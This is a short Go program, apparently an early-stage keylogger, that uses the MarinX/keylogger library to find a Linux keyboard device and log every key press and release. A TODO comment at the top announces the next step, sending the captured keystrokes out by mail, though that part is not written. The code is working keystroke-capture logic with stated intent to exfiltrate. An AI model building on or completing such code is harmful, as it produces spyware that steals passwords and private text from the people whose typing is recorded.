package main

import (
	"github.com/MarinX/keylogger"
	log "github.com/sirupsen/logrus"
)

// TODO:
//		1. Read Keyboard
//		2. Send to mail

func main() {
	log.Println("Welcome")

	readKeyboard()
}

func readKeyboard() {
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) <= 0 {
		log.Error("No Keyboard Found")
		return
	}

	log.Println("Found a Keyboard at", keyboard)

	k, err := keylogger.New(keyboard)
	check(err)
	defer k.Close()

	events := k.Read()

	// range of events
	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			// if the state of key is pressed
			if e.KeyPress() {
				log.Println("[event] press key ", e.KeyString())
			}

			// if the state of key is released
			if e.KeyRelease() {
				log.Println("[event] release key ", e.KeyString())
			}
		}
	}
}

func check(e error) {
	if e != nil {
		log.Error(e)
	}
}
